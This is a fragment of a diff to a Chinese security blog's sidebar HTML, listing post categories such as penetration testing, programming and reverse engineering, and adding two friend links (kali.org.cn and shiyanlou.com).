class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/内网/">内网</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/工具/">工具</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/提取/">提取</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/提权/">提权</a><span class="category-list-count">11</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/注入/">注入</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/端口/">端口</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/笔记/">笔记</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/资源/">资源</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/">编程开发</a><span class="category-list-count">7</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/Python/">Python</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/javascript/">javascript</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/逆向工程/">逆向工程</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/逆向工程/mips/">mips</a><span class="category-list-count">1</span></li></ul></li></ul>
 </div>
 
 
@@ -898,6 +880,18 @@
           <li>
             
             	<a href="http://www.91ri.org" target="_blank" title="内网挺可以">91安全</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.kali.org.cn" target="_blank" title="kali linux">kali linux</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.shiyanlou.com" target="_blank" title="实验楼">实验楼</a>
             
           </li>
         
